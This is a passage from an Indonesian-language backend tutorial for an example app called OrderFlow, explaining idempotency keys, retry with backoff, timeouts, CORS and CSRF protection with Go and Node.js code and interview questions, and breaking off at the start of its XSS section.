`POST /payments` di OrderFlow secara default bukan idempotent — kalau client kirim request bayar, koneksi timeout sebelum response sampai, dan client retry, tanpa mekanisme tambahan itu bisa jadi dua transaksi charge yang terpisah untuk satu pembelian. Idempotency key memastikan retry yang legitimate gak menyebabkan efek ganda (double charge), sambil tetap membolehkan request baru yang memang berbeda.

### Cara Kerja
```
Client kirim POST /payments dengan header Idempotency-Key: <uuid client-generated>

Server:
  key := "idempotency:" + idempotencyKey
  SET key "processing" NX EX 60   -- NX: hanya set kalau belum ada key ini

  kalau SET berhasil (key belum ada) -> proses payment seperti biasa
     -> setelah selesai, simpan response & status ke key yang sama (overwrite, TTL lebih lama)
  kalau SET gagal (key sudah ada):
     -> value = "processing" -> masih diproses request sebelumnya -> balikin 409 Conflict
     -> value = response yang sudah tersimpan -> balikin response yang sama itu (bukan proses ulang)
```

### Contoh Kode — Go
```go
package middleware

import (
	"bytes"
	"encoding/json"
	"net/http"
	"time"

	"github.com/redis/go-redis/v9"
)

type cachedResponse struct {
	StatusCode int    `json:"status_code"`
	Body       []byte `json:"body"`
}

// responseRecorder menangkap response yang ditulis handler, supaya bisa
// disimpan ke Redis dan dikirim ulang persis sama kalau ada retry.
type responseRecorder struct {
	http.ResponseWriter
	statusCode int
	body       bytes.Buffer
}

func (rec *responseRecorder) WriteHeader(code int) {
	rec.statusCode = code
	rec.ResponseWriter.WriteHeader(code)
}

func (rec *responseRecorder) Write(b []byte) (int, error) {
	rec.body.Write(b)
	return rec.ResponseWriter.Write(b)
}

// IdempotencyMiddleware mencegah request POST yang sama (dikenali lewat
// header Idempotency-Key) diproses lebih dari sekali — kritikal untuk POST /payments.
func IdempotencyMiddleware(rdb *redis.Client) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			idemKey := r.Header.Get("Idempotency-Key")
			if idemKey == "" {
				http.Error(w, "missing Idempotency-Key header", http.StatusBadRequest)
				return
			}

			redisKey := "idempotency:" + idemKey
			ok, err := rdb.SetNX(r.Context(), redisKey, "processing", 60*time.Second).Result()
			if err != nil {
				http.Error(w, "internal error", http.StatusInternalServerError)
				return
			}

			if !ok {
				// Key sudah ada: entah masih diproses, entah sudah ada hasilnya.
				existing, _ := rdb.Get(r.Context(), redisKey).Result()
				if existing == "processing" {
					http.Error(w, "request with this idempotency key is still processing", http.StatusConflict)
					return
				}
				var cached cachedResponse
				if err := json.Unmarshal([]byte(existing), &cached); err == nil {
					w.WriteHeader(cached.StatusCode)
					w.Write(cached.Body)
					return
				}
			}

			rec := &responseRecorder{ResponseWriter: w, statusCode: http.StatusOK}
			next.ServeHTTP(rec, r)

			// Simpan hasil final supaya retry berikutnya dengan key yang sama
			// dapat response identik, bukan proses payment lagi.
			cached, _ := json.Marshal(cachedResponse{StatusCode: rec.statusCode, Body: rec.body.Bytes()})
			rdb.Set(r.Context(), redisKey, cached, 24*time.Hour)
		})
	}
}
```
Pemakaian di endpoint pembayaran:
```go
r.With(auth.Middleware, middleware.IdempotencyMiddleware(rdb)).
	Post("/payments", handler.CreatePayment)
```

### Contoh Kode — Node.js
```javascript
// idempotencyMiddleware mencegah request POST yang sama (dikenali lewat
// header Idempotency-Key) diproses lebih dari sekali — kritikal untuk POST /payments.
function idempotencyMiddleware(redisClient) {
  return async (req, res, next) => {
    const idemKey = req.header('Idempotency-Key');
    if (!idemKey) {
      return res.status(400).json({ error: 'missing Idempotency-Key header' });
    }

    const redisKey = `idempotency:${idemKey}`;
    const acquired = await redisClient.set(redisKey, 'processing', 'EX', 60, 'NX');

    if (!acquired) {
      const existing = await redisClient.get(redisKey);
      if (existing === 'processing') {
        return res.status(409).json({ error: 'request with this idempotency key is still processing' });
      }
      const cached = JSON.parse(existing);
      return res.status(cached.statusCode).json(cached.body);
    }

    // Bungkus res.json supaya response final ikut disimpan ke Redis,
    // jadi retry berikutnya dengan key yang sama dapat response identik.
    const originalJson = res.json.bind(res);
    res.json = (body) => {
      redisClient.set(
        redisKey,
        JSON.stringify({ statusCode: res.statusCode, body }),
        'EX',
        24 * 60 * 60
      );
      return originalJson(body);
    };

    return next();
  };
}

module.exports = { idempotencyMiddleware };
```
Pemakaian di endpoint pembayaran:
```javascript
const { idempotencyMiddleware } = require('../middleware/idempotencyMiddleware');
const redisClient = require('../redisClient');

app.post('/payments', authenticate, idempotencyMiddleware(redisClient), paymentHandler.createPayment);
```

### Trade-off & Pitfall
- Idempotency key harus digenerate di sisi client (biasanya UUID) dan sama persis dipakai ulang saat retry — kalau client generate key baru setiap retry, mekanisme ini gak berguna sama sekali.
- Contoh di atas gak memvalidasi apakah body request identik dengan request pertama yang memakai key yang sama — implementasi lebih ketat biasanya juga simpan hash body, dan tolak (422) kalau key sama tapi body-nya beda, buat mencegah salah pakai key.
- TTL penyimpanan response yang terlalu pendek bikin retry yang datang telat (network lambat) gagal ke-dedup; terlalu panjang membebani Redis dengan data yang gak kepake lagi. 24 jam adalah nilai umum tapi harus disesuaikan pola retry client OrderFlow.
- Idempotency-Key beda konsep dengan idempotent method di HTTP (topik 10) — PUT/DELETE sudah idempotent secara natural by definition HTTP, sementara POST butuh mekanisme tambahan ini karena secara default dianggap non-idempotent.

### Kapan Dipakai
Wajib di endpoint POST yang punya efek finansial atau efek samping yang mahal buat diulang — pembayaran (`POST /payments`) adalah contoh paling jelas, tapi juga relevan untuk `POST /orders` (mencegah order duplikat akibat double-click atau retry jaringan).

### Sering Ditanya Saat Interview
- "Kenapa idempotency key harus digenerate client, bukan server?" — supaya client bisa memakai key yang sama persis saat retry request yang gagal; kalau server yang generate, tiap request (termasuk retry) otomatis dianggap baru.
- "Apa yang terjadi kalau dua request dengan Idempotency-Key sama tapi body berbeda dikirim?" — idealnya server mendeteksi ini (lewat hash body) dan menolaknya, karena itu tanda client salah memakai ulang key yang seharusnya unik per intent transaksi.
- "Kenapa idempotency penting khusus untuk POST /payments dibanding endpoint GET biasa?" — GET sudah safe & idempotent secara natural (gak mengubah state), sementara POST /payments mengubah state finansial nyata; retry tanpa idempotency key bisa berarti user tercharge dua kali.

---

## 17. Retry

### Apa itu?
Retry adalah strategi mengulang request yang gagal karena error transient (timeout, 503, koneksi putus sesaat) dengan harapan percobaan berikutnya berhasil, biasanya dengan jeda waktu antar percobaan yang makin panjang (exponential backoff).

### Kenapa dibutuhkan?
Kegagalan jaringan atau kegagalan sesaat di service lain (misalnya API partner logistik yang OrderFlow panggil buat cek ongkir) itu wajar terjadi, dan seringkali sembuh sendiri dalam beberapa saat. Tanpa retry, satu gangguan sesaat langsung jadi error yang ditunjukkan ke user, padahal percobaan kedua kemungkinan besar berhasil. Tapi retry yang gak hati-hati — terutama untuk operasi non-idempotent seperti `POST /payments` — bisa menyebabkan efek ganda kalau gak dikombinasikan dengan idempotency key (topik 16).

### Cara Kerja
```
Percobaan 1 gagal (5xx / timeout / connection error)
  -> tunggu backoff_1 (misal 200ms + jitter random)
Percobaan 2 gagal
  -> tunggu backoff_2 (misal 400ms + jitter)
Percobaan 3 gagal
  -> tunggu backoff_3 (misal 800ms + jitter)
Percobaan ke-N gagal -> stop, propagate error ke caller (jangan retry selamanya)

Hanya retry untuk: error transient (timeout, 502/503/504) dan method yang aman diulang
  (GET, atau POST dengan Idempotency-Key yang sudah dipasang)
Jangan retry untuk: 4xx (client error, gak akan berubah walau diulang), business error
```

### Contoh Kode — Go
```go
package client

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"time"
)

// withRetry mengulang fn sampai maxAttempts, dengan exponential backoff + jitter.
// Dipakai OrderFlow saat memanggil API partner logistik yang kadang timeout sesaat.
func withRetry(ctx context.Context, maxAttempts int, fn func() (*http.Response, error)) (*http.Response, error) {
	var lastErr error
	for attempt := 0; attempt < maxAttempts; attempt++ {
		if attempt > 0 {
			backoff := time.Duration(1<<attempt) * 100 * time.Millisecond
			jitter := time.Duration(rand.Intn(100)) * time.Millisecond
			select {
			case <-time.After(backoff + jitter):
			case <-ctx.Done():
				return nil, ctx.Err()
			}
		}

		resp, err := fn()
		if err == nil && resp.StatusCode < 500 && resp.StatusCode != http.StatusTooManyRequests {
			return resp, nil // sukses, atau 4xx (selain 429) yang gak perlu diulang
		}
		lastErr = err
		if err == nil {
			// termasuk 429 (rate limited oleh partner) -> tetap diulang dengan backoff,
			// bukan langsung dikembalikan ke caller
			lastErr = fmt.Errorf("upstream returned status %d", resp.StatusCode)
		}
	}
	return nil, fmt.Errorf("failed after %d attempts: %w", maxAttempts, lastErr)
}

// GetShippingQuote memanggil partner logistik untuk hitung ongkir,
// retry otomatis kalau partner sedang mengalami gangguan sesaat.
func GetShippingQuote(ctx context.Context, httpClient *http.Client, orderID int64) (*http.Response, error) {
	return withRetry(ctx, 3, func() (*http.Response, error) {
		req, _ := http.NewRequestWithContext(ctx, http.MethodGet,
			fmt.Sprintf("https://logistics-partner.example.com/quotes?order_id=%d", orderID), nil)
		return httpClient.Do(req)
	})
}
```

### Contoh Kode — Node.js
```javascript
const axios = require('axios');

// withRetry mengulang fn sampai maxAttempts, dengan exponential backoff + jitter.
// Dipakai OrderFlow saat memanggil API partner logistik yang kadang timeout sesaat.
async function withRetry(fn, maxAttempts = 3) {
  let lastErr;
  for (let attempt = 0; attempt < maxAttempts; attempt++) {
    if (attempt > 0) {
      const backoff = 2 ** attempt * 100;
      const jitter = Math.floor(Math.random() * 100);
      await new Promise((resolve) => setTimeout(resolve, backoff + jitter));
    }

    try {
      const response = await fn();
      return response; // sukses
    } catch (err) {
      const status = err.response?.status;
      if (status && status < 500 && status !== 429) {
        throw err; // 4xx (selain 429) gak akan berubah walau diulang
      }
      lastErr = err;
    }
  }
  throw new Error(`failed after ${maxAttempts} attempts: ${lastErr.message}`);
}

// getShippingQuote memanggil partner logistik untuk hitung ongkir,
// retry otomatis kalau partner sedang mengalami gangguan sesaat.
async function getShippingQuote(orderId) {
  return withRetry(() =>
    axios.get('https://logistics-partner.example.com/quotes', {
      params: { order_id: orderId },
      timeout: 5000,
    })
  );
}

module.exports = { getShippingQuote, withRetry };
```

### Trade-off & Pitfall
- Retry tanpa idempotency key untuk operasi non-idempotent (`POST /payments`) berisiko efek ganda — retry harus selalu dikombinasikan dengan topik 16 untuk operasi yang punya side effect finansial.
- Jitter (variasi random di waktu tunggu) penting untuk mencegah "thundering herd" — kalau banyak client retry dengan backoff yang persis sama waktunya, semua akan membombardir server lagi secara bersamaan tepat di momen yang sama.
- Retry buta tanpa batas attempt bisa memperparah insiden — kalau downstream service sedang overload, retry dari banyak client cuma menambah beban (retry storm) dan memperlambat recovery. Circuit breaker (di luar scope topik ini) sering dipasangkan dengan retry untuk kasus ini.
- Jangan retry status 4xx (selain 429) — error itu berarti request-nya sendiri yang salah (validasi, auth, dst), mengulang persis sama gak akan mengubah hasil.

### Kapan Dipakai
Dipakai untuk panggilan ke service eksternal/partner yang diketahui kadang mengalami gangguan transient (network blip, restart sesaat), khususnya untuk request GET atau request yang sudah dilindungi idempotency key. Hindari retry otomatis untuk operasi yang efeknya gak reversible dan belum idempotent.

### Sering Ditanya Saat Interview
- "Kapan sebuah request aman untuk di-retry otomatis?" — kalau method-nya idempotent secara natural (GET, PUT, DELETE) atau non-idempotent tapi sudah dilindungi idempotency key, dan error-nya bersifat transient (timeout, 5xx), bukan client error (4xx).
- "Apa fungsi jitter di exponential backoff?" — mencegah banyak client retry di waktu yang persis bersamaan (thundering herd) yang bisa memperparah beban di server yang sedang recover.
- "Gimana retry bisa memperparah insiden alih-alih membantu?" — kalau downstream sedang overload, retry storm dari banyak client menambah traffic justru di saat kapasitas paling terbatas, memperlambat recovery — makanya sering dikombinasikan dengan circuit breaker dan retry budget.

---

## 18. Timeout

### Apa itu?
Timeout adalah batas waktu maksimum yang ditunggu sebelum sebuah operasi (request HTTP keluar, query database, panggilan ke Redis) dianggap gagal dan dibatalkan, daripada ditunggu tanpa batas.

### Kenapa dibutuhkan?
Tanpa timeout, satu downstream yang lambat atau hang (database yang lock, partner API yang gak respon) bisa membuat goroutine/thread yang menanganinya tertahan selamanya, menghabiskan koneksi, memory, dan file descriptor sampai server OrderFlow sendiri kehabisan resource dan gak bisa layani request lain — meskipun request lain itu gak ada hubungannya sama sekali dengan downstream yang lambat itu.

### Cara Kerja
```
Timeout ada di banyak layer, masing-masing perlu diset:
  - Server-level: berapa lama server nunggu client kirim/baca data (ReadTimeout/WriteTimeout)
  - Client-level (outgoing call): berapa lama nunggu response dari downstream (DB, partner API, Redis)
  - Context-level (Go)/AbortController (Node): propagasi "batal" ke semua operasi turunan
    dalam satu request, supaya kalau request awal dibatalkan, semua sub-operasi ikut berhenti.
```

### Contoh Kode — Go
```go
package server

import (
	"net/http"
	"time"
)

// Timeout di level server: mencegah client yang lambat/nakal (slow body upload,
// slow read response) menahan koneksi server tanpa batas.
func NewServer(handler http.Handler) *http.Server {
	return &http.Server{
		Addr:         ":8080",
		Handler:      handler,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  60 * time.Second,
	}
}
```
Timeout di level outgoing call (memanggil partner logistik) dan di level query database:
```go
package client

import (
	"context"
	"net/http"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
)

var httpClient = &http.Client{Timeout: 5 * time.Second}

func GetShippingQuote(ctx context.Context, orderID int64) (*http.Response, error) {
	// context.WithTimeout membatasi seluruh percobaan (termasuk retry) ke 5 detik,
	// dan otomatis membatalkan request kalau caller-nya sendiri sudah di-cancel.
	ctx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	req, _ := http.NewRequestWithContext(ctx, http.MethodGet,
		"https://logistics-partner.example.com/quotes", nil)
	return httpClient.Do(req)
}

func FindOrderByID(ctx context.Context, db *pgxpool.Pool, id int64) (*Order, error) {
	// Query DB juga dibatasi — query yang nyangkut (misal karena lock) gak boleh
	// menahan koneksi pool selamanya.
	ctx, cancel := context.WithTimeout(ctx, 3*time.Second)
	defer cancel()

	var o Order
	err := db.QueryRow(ctx, `SELECT id, user_id, status, total FROM orders WHERE id = $1`, id).
		Scan(&o.ID, &o.UserID, &o.Status, &o.Total)
	return &o, err
}
```

### Contoh Kode — Node.js
```javascript
const http = require('http');
const app = require('./app');

// Timeout di level server: mencegah client yang lambat/nakal menahan koneksi tanpa batas.
const server = http.createServer(app);
server.requestTimeout = 5000;   // batas waktu terima seluruh request
server.headersTimeout = 3000;   // batas waktu terima headers
server.keepAliveTimeout = 60000;

server.listen(8080);
```
Timeout di level outgoing call dan query database:
```javascript
const axios = require('axios');

async function getShippingQuote(orderId) {
  // timeout di axios membatalkan request kalau partner gak respon dalam 5 detik.
  return axios.get('https://logistics-partner.example.com/quotes', {
    params: { order_id: orderId },
    timeout: 5000,
  });
}

async function findOrderById(pool, id) {
  // statement_timeout membatasi query yang nyangkut di sisi Postgres,
  // supaya gak menahan koneksi pool selamanya.
  const client = await pool.connect();
  try {
    await client.query('SET statement_timeout = 3000'); // 3 detik, dalam ms
    const result = await client.query(
      'SELECT id, user_id, status, total FROM orders WHERE id = $1',
      [id]
    );
    return result.rows[0];
  } finally {
    client.release();
  }
}

module.exports = { getShippingQuote, findOrderById };
```

### Trade-off & Pitfall
- Timeout yang terlalu pendek membatalkan operasi yang sebenarnya cuma butuh sedikit lebih lama dari biasanya (misalnya saat traffic spike wajar), menyebabkan error palsu; terlalu panjang gagal melindungi resource server saat downstream benar-benar hang.
- Context timeout di Go (atau AbortController di Node) cuma membatalkan sisi caller — kalau operasi di sisi server/downstream gak juga menghormati cancellation, resource di sisi sana tetap terpakai sampai operasinya sendiri selesai (misalnya query DB yang di-cancel dari sisi client Go, tapi Postgres-nya masih jalanin query itu sampai selesai kalau gak ada `statement_timeout` di sisi DB juga).
- Timeout harus dikalibrasi berlapis: total timeout end-to-end untuk satu request harus cukup buat semua sub-operasi (DB query + panggilan partner API + retry) tanpa exceed timeout di layer yang lebih luar (misalnya load balancer).
- Timeout dan retry (topik 17) saling berkaitan — total waktu maksimum yang ditunggu user adalah `timeout per attempt x jumlah attempt`, jangan lupa hitung itu supaya user gak nunggu terlalu lama sebelum akhirnya tetap gagal.

### Kapan Dipakai
Selalu, di semua operasi I/O yang melibatkan network atau resource eksternal — panggilan ke database, Redis, partner API, dan juga di level server buat membatasi request masuk. Gak ada operasi network yang boleh dianggap "pasti cepat" tanpa batas waktu eksplisit.

### Sering Ditanya Saat Interview
- "Apa yang terjadi kalau OrderFlow gak set timeout ke database sama sekali?" — satu query yang lambat/nyangkut (misalnya karena lock) bisa menahan koneksi di connection pool selamanya, lama-lama semua koneksi di pool terpakai dan request lain gak kebagian koneksi buat query.
- "Apa beda connect timeout dan read/response timeout?" — connect timeout membatasi waktu membangun koneksi TCP/TLS awal; read/response timeout membatasi waktu menunggu data/response setelah koneksi terbentuk. Downstream yang connect cepat tapi lambat merespon butuh read timeout, bukan cuma connect timeout.
- "Gimana context timeout Go berhubungan dengan resource downstream?" — context cuma mengontrol sisi caller (kapan berhenti nunggu/pakai koneksi), gak otomatis membatalkan pekerjaan yang sudah terlanjur jalan di sisi downstream kecuali downstream itu juga menghormati sinyal cancellation atau punya timeout-nya sendiri.

---

## 19. CORS

### Apa itu?
CORS (Cross-Origin Resource Sharing) adalah mekanisme browser yang mengatur apakah JavaScript yang berjalan di satu origin (misalnya `https://app.orderflow.com`) boleh membuat request ke origin lain (misalnya `https://api.orderflow.com`), berdasarkan header yang dikirim balik oleh server.

### Kenapa dibutuhkan?
Secara default, browser menerapkan Same-Origin Policy: JavaScript di satu origin gak boleh baca response dari origin lain, sebagai proteksi dasar terhadap website jahat yang mencoba diam-diam memanggil API bank/aplikasi lain atas nama user yang sedang login di sana. Karena frontend OrderFlow (di `app.orderflow.com`) dan API-nya (di `api.orderflow.com`) berada di origin berbeda, server API harus secara eksplisit mengizinkan origin frontend itu lewat header CORS, kalau gak browser akan blok response-nya sebelum sampai ke kode JavaScript frontend.

### Cara Kerja
```
Untuk request "non-simple" (misalnya ada header Authorization, method PATCH/DELETE):
  Browser -- OPTIONS /orders/42 (preflight) -------> Server
    Origin: https://app.orderflow.com
    Access-Control-Request-Method: PATCH
  Server -- 204 No Content -------------------------> Browser
    Access-Control-Allow-Origin: https://app.orderflow.com
    Access-Control-Allow-Methods: GET, POST, PATCH, DELETE
    Access-Control-Allow-Headers: Authorization, Content-Type
  Browser cek: origin & method diizinkan? -> lanjutkan request aslinya (PATCH /orders/42)
                                           -> kalau enggak, request asli gak pernah dikirim
```

### Contoh Kode — Go
```go
package middleware

import "net/http"

var allowedOrigins = map[string]bool{
	"https://app.orderflow.com": true,
	"http://localhost:3000":     true, // dev environment
}

// CORSMiddleware mengizinkan frontend OrderFlow (origin berbeda dari API)
// memanggil API ini dari browser.
func CORSMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		origin := r.Header.Get("Origin")
		if allowedOrigins[origin] {
			w.Header().Set("Access-Control-Allow-Origin", origin)
			w.Header().Set("Access-Control-Allow-Credentials", "true")
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PATCH, DELETE, OPTIONS")
			w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type")
		}

		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}

		next.ServeHTTP(w, r)
	})
}
```

### Contoh Kode — Node.js
```javascript
const cors = require('cors');

const allowedOrigins = new Set([
  'https://app.orderflow.com',
  'http://localhost:3000', // dev environment
]);

// corsMiddleware mengizinkan frontend OrderFlow (origin berbeda dari API)
// memanggil API ini dari browser.
const corsMiddleware = cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.has(origin)) {
      return callback(null, true);
    }
    return callback(new Error('origin not allowed by CORS'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Authorization', 'Content-Type'],
});

module.exports = { corsMiddleware };
```
Pemakaian:
```javascript
const express = require('express');
const { corsMiddleware } = require('./middleware/cors');

const app = express();
app.use(corsMiddleware);
```

### Trade-off & Pitfall
- Jangan pernah pakai `Access-Control-Allow-Origin: *` bersamaan dengan `Access-Control-Allow-Credentials: true` — kombinasi ini gak diizinkan browser modern (dan kalaupun bisa dipaksa, itu berarti origin manapun bisa membaca response dengan credential user, sangat berbahaya).
- CORS itu proteksi di sisi browser, bukan proteksi server — request langsung dari server-to-server (curl, Postman, service lain) gak kena aturan CORS sama sekali, karena CORS ditegakkan oleh browser, bukan API. Jangan mengandalkan CORS sebagai satu-satunya lapisan keamanan; authentication/authorization (topik 13/14) tetap wajib.
- Allowlist origin harus di-maintain manual (seperti contoh di atas) — kalau frontend pindah domain atau nambah subdomain baru, request-nya akan diblokir browser sampai allowlist di-update.
- Response error dari server (misalnya 500) tetap harus menyertakan header CORS yang benar, karena kalau enggak, browser akan menampilkan error CORS generik ke developer padahal masalah sebenarnya ada di server — bikin debugging membingungkan.

### Kapan Dipakai
Wajib dikonfigurasi begitu API OrderFlow dipanggil langsung dari JavaScript di browser yang berjalan di origin berbeda dari API-nya. Kalau API cuma dipanggil server-to-server (mobile app native, service lain, curl dari backend), CORS gak relevan sama sekali karena mekanisme ini spesifik untuk browser.

### Sering Ditanya Saat Interview
- "Kenapa CORS gak dianggap sebagai fitur keamanan API yang sebenarnya?" — CORS cuma mengatur perilaku browser (apakah JS di origin lain boleh baca response), gak mencegah request itu sendiri terkirim atau diproses server; request langsung dari luar browser (curl, service lain) gak terpengaruh sama sekali.
- "Kapan browser mengirim preflight OPTIONS request?" — untuk request yang dianggap 'non-simple', misalnya method selain GET/POST/HEAD, atau ada custom header seperti `Authorization`, atau `Content-Type` selain beberapa nilai standar.
- "Kenapa `Access-Control-Allow-Origin: *` gak bisa dipakai bersama credentials?" — kalau origin manapun boleh membaca response yang membawa credential (cookie/token) milik user, itu sama saja membuka data user ke siapa saja yang bisa membuat website — bertentangan dengan tujuan CORS sendiri.

---

## 20. CSRF

### Apa itu?
CSRF (Cross-Site Request Forgery) adalah serangan di mana website jahat membuat browser korban yang sedang login mengirim request ke API OrderFlow tanpa sepengetahuan korban, dengan memanfaatkan credential (biasanya cookie session) yang otomatis disertakan browser ke setiap request ke domain OrderFlow, terlepas dari halaman mana yang men-trigger request itu.

### Kenapa dibutuhkan?
CSRF relevan khusus untuk mekanisme auth yang mengandalkan cookie yang otomatis dikirim browser (seperti session-based auth di Phase 1 topik 6) — kalau korban sedang login ke OrderFlow lewat cookie, dan mengunjungi website jahat yang punya form tersembunyi yang auto-submit ke `POST https://api.orderflow.com/orders`, browser akan menyertakan cookie session OrderFlow tanpa korban sadar, dan server yang cuma mengandalkan "ada cookie valid = request legitimate" bisa memproses order palsu itu.

### Cara Kerja
```
Mitigasi utama, dikombinasikan:
1. SameSite cookie attribute — cookie session di-set SameSite=Lax/Strict,
   browser gak mengirim cookie itu untuk request cross-site (dari domain lain)
2. CSRF token (synchronizer token pattern) — server generate token acak per sesi,
   client wajib mengirim token itu balik di header/body custom, website jahat
   gak bisa tau/membaca token ini (beda dengan cookie yang otomatis terkirim)

Request dengan cookie session tapi tanpa CSRF token yang cocok -> ditolak 403
```
Untuk API OrderFlow yang menggunakan Bearer token JWT di header `Authorization` (bukan cookie), CSRF secara natural jauh lebih kecil risikonya — browser gak otomatis melampirkan header Authorization ke request cross-site, jadi website jahat gak bisa memaksa browser mengirim token itu.

### Contoh Kode — Go
Untuk endpoint yang memakai session cookie (Phase 1 topik 6), bukan Bearer JWT:
```go
package middleware

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"net/http"
)

const csrfTokenSessionKey = "csrf_token"

func generateCSRFToken() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// IssueCSRFToken dipanggil setelah login berbasis session, menyimpan token
// di session store dan mengirimkannya ke client (biasanya lewat body response,
// supaya frontend bisa menyimpannya dan mengirim balik di header custom).
func IssueCSRFToken(ctx context.Context, sessionStore SessionStore, sessionID string) (string, error) {
	token := generateCSRFToken()
	if err := sessionStore.Set(ctx, sessionID, csrfTokenSessionKey, token); err != nil {
		return "", err
	}
	return token, nil
}

// RequireCSRFToken menolak request state-changing yang gak menyertakan
// CSRF token yang cocok dengan yang tersimpan di session.
// Cookie session ikut kekirim otomatis oleh browser, tapi header X-CSRF-Token
// ini gak bisa ditebak/dikirim oleh website jahat lain.
func RequireCSRFToken(sessionStore SessionStore) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			cookie, err := r.Cookie("session_id")
			if err != nil {
				http.Error(w, "unauthorized", http.StatusUnauthorized)
				return
			}

			expected, err := sessionStore.Get(r.Context(), cookie.Value, csrfTokenSessionKey)
			if err != nil {
				http.Error(w, "unauthorized", http.StatusUnauthorized)
				return
			}

			submitted := r.Header.Get("X-CSRF-Token")
			if submitted == "" || submitted != expected {
				http.Error(w, "invalid csrf token", http.StatusForbidden)
				return
			}

			next.ServeHTTP(w, r)
		})
	}
}
```

### Contoh Kode — Node.js
```javascript
const crypto = require('crypto');

// issueCsrfToken dipanggil setelah login berbasis session, menyimpan token
// di session dan mengirimkannya ke client lewat body response.
function issueCsrfToken(req) {
  const token = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = token;
  return token;
}

// requireCsrfToken menolak request state-changing yang gak menyertakan
// CSRF token yang cocok dengan yang tersimpan di session.
// Cookie session ikut kekirim otomatis oleh browser, tapi header X-CSRF-Token
// ini gak bisa ditebak/dikirim oleh website jahat lain.
function requireCsrfToken(req, res, next) {
  const submitted = req.header('X-CSRF-Token');
  if (!req.session.csrfToken || submitted !== req.session.csrfToken) {
    return res.status(403).json({ error: 'invalid csrf token' });
  }
  return next();
}

module.exports = { issueCsrfToken, requireCsrfToken };
```
Pemakaian, dan setting cookie session dengan `SameSite` sebagai lapisan proteksi tambahan:
```javascript
app.use(session({
  store: redisSessionStore,
  secret: process.env.SESSION_SECRET,
  cookie: { httpOnly: true, secure: true, sameSite: 'lax' }, // mitigasi tambahan di level cookie
}));

app.post('/orders', requireSession, requireCsrfToken, orderHandler.createOrder);
```

### Trade-off & Pitfall
- API OrderFlow yang murni pakai Bearer JWT di header `Authorization` (pola utama yang dipakai di seluruh phase ini) secara natural gak butuh CSRF token — CSRF khusus relevan untuk endpoint yang memakai cookie sebagai credential otomatis. Jangan pasang CSRF protection ke endpoint yang gak pakai cookie sama sekali, itu proteksi yang gak perlu.
- `SameSite=Strict` paling aman tapi bisa merusak UX (misalnya cookie gak terkirim saat user klik link dari email/website lain ke OrderFlow); `SameSite=Lax` kompromi umum yang masih mengizinkan navigasi top-level tapi blok request cross-site dari form/fetch.
- CSRF token yang disimpan di localStorage (bukan di-generate ulang per request/session dengan benar) bisa balik rentan ke XSS (topik 21) — kalau attacker bisa jalankan script di halaman OrderFlow, dia bisa baca token itu juga.
- Kombinasi SameSite cookie + CSRF token adalah defense in depth — jangan cuma andalkan satu, karena SameSite belum didukung 100% konsisten di semua browser lama, dan CSRF token bisa salah implementasi (misalnya validasi yang gak strict/konstan waktu).

### Kapan Dipakai
Dipakai khusus untuk endpoint yang mengandalkan cookie (session-based auth) untuk state-changing operations (POST/PUT/PATCH/DELETE). Untuk arsitektur OrderFlow yang mayoritas pakai Bearer JWT di header, CSRF protection eksplisit ini gak dibutuhkan untuk endpoint tersebut — cukup pastikan token JWT gak pernah otomatis terkirim seperti cookie (dan memang secara desain browser gak melakukan itu).

### Sering Ditanya Saat Interview
- "Kenapa API yang pakai Bearer token di header lebih resisten terhadap CSRF dibanding session cookie?" — browser gak otomatis melampirkan header custom seperti `Authorization` ke request cross-site, jadi website jahat gak punya cara memaksa browser mengirim token itu, beda dengan cookie yang otomatis terlampir ke domain terkait.
- "Apa beda SameSite=Strict, Lax, dan None?" — Strict: cookie gak dikirim sama sekali untuk request cross-site termasuk navigasi biasa; Lax: cookie dikirim untuk navigasi top-level (klik link) tapi gak untuk request dari form/fetch cross-site; None: cookie selalu dikirim cross-site (butuh `Secure`), biasanya dipakai untuk kasus integrasi pihak ketiga yang memang butuh itu.
- "Kenapa gak cukup mengandalkan SameSite cookie saja tanpa CSRF token?" — dukungan SameSite bervariasi di browser lama, dan beberapa skenario (subdomain, browser tertentu) masih punya celah, jadi CSRF token dipakai sebagai lapisan pertahanan tambahan (defense in depth), bukan pengganti satu sama lain.

---

## 21. XSS

### Apa itu?
XSS (Cross-Site Scripting) adalah vulnerability di mana attacker berhasil menyisipkan script (biasanya JavaScript) yang kemudian dieksekusi di browser korban lain, seolah-olah script itu bagian sah dari halaman OrderFlow — misalnya lewat kolom nama produk, catatan order, atau review yang gak di-escape saat ditampilkan.

### Kenapa dibutuhkan?
Kalau OrderFlow menampilkan input user (misalnya catatan pengiriman order, atau nama produk yang diinput admin) tanpa escaping yang benar, attacker bisa memasukkan `<script>` yang nantinya dieksekusi di browser user lain yang melihat halaman itu — bisa buat mencuri token/cookie session, melakukan aksi atas nama korban, atau redirect ke halaman phishing.

### Cara Kerja
```
Stored XSS:  attacker simpan payload script ke database (misal lewat field "catatan order")
             -> tersimpan permanen -> tereksekusi setiap kali user lain melihat data itu
Reflected XSS: payload dikirim lewat parameter URL/form -> server langsung
             merefleksikannya balik ke response HTML tanpa escaping -> tereksekusi sekali saat itu

Mitigasi utama:
  - Output encoding/escaping: HTML-escape semua data yang di-render ke dalam HTML
    (bukan cuma waktu disimpan — escaping harus terjadi di titik output)
  - Content-Security-Policy (CSP) header: batasi sumber script yang boleh dieksekusi browser
  - httpOnly cookie untuk token sensitif, supaya walau ada XSS, script gak bisa membacanya
```

### Contoh Kode — Go
```go
